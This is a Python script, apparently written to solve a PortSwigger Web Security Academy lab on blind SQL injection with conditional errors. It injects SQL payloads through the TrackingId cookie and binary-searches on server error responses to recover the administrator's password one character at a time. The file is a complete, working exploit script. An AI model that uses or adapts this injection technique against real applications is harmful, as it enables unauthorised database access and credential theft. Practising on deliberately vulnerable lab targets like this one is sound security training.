import requests

# This script was made for solving this lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
# It's a little gross and dirty, but it does the trick. TODO: make it neater one day maybe. lel.
# To use, ensure the domain is correct. They spin up a vm for each lab, so the 0a3500f103da630f802af899000000e9
# part will be different.

domain = "0a3500f103da630f802af899000000e9.web-security-academy.net"
url = f"https://{domain}"

with requests.Session() as s:
    password = ""
    count = 0 # debug - just in case we make bad logic and get into an infinite loop
    letter_num = 1
    next_letter = ""

    while len(password) < 20 and count < 10000:
        left_letter = '/' # ascii char just before 0
        right_letter = '{' # ascii char just after z

        while ord(right_letter) - ord(left_letter) > 1 and count < 1000:
            count += 1

            if ord(right_letter) - ord(left_letter) == 3: # we have narrowed it down to 2 possible letters. See which one it is
                injection = f"asdf' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{letter_num},1)='{chr(ord(left_letter)+1)}') THEN TO_CHAR(1/0) ELSE 'a' END p FROM users WHERE username='administrator')='a"
                s.cookies.set('TrackingId', None)
                s.cookies.set('TrackingId', injection, domain=domain)
                r = s.get(url)

                if ("Internal Server Error" in r.text):
                    next_letter = chr(ord(left_letter)+1)
                else:
                    next_letter = chr(ord(right_letter)-1)

                break
            else: # we are still trying to narrow the gap
                halfway = chr(((ord(right_letter) - ord(left_letter))//2) + ord(left_letter))
                injection = f"asdf' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{letter_num},1)>'{halfway}') THEN TO_CHAR(1/0) ELSE 'a' END p FROM users WHERE username='administrator')='a"
                s.cookies.set('TrackingId', None)
                s.cookies.set('TrackingId', injection, domain=domain)
                r = s.get(url)

                if ("Internal Server Error" in r.text):
                    left_letter = chr(ord(halfway) - 1)
                else:
                    right_letter = chr(ord(halfway) + 1)

        password += next_letter
        print(f"password progress: {password}")
        letter_num += 1
        
    print(f"password: {password}")
